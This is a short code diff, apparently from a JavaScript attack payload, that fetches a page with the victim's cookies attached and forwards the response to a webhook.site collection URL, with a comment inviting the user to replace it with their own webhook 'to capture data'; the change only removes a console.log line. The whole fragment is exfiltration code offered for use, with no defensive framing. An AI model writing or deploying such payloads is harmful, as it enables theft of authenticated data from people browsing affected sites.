@@ -5,7 +5,6 @@
   credentials: "include"  // This sends cookies with the request
 })
   .then(response => response.text())
-  .then(data => console.log(data))
   .then(data => {
       // Replace with your webhook URL to capture data
       fetch('https://webhook.site/5beb3f37-64a6-4b44-aa9b-372678d00ba8', {
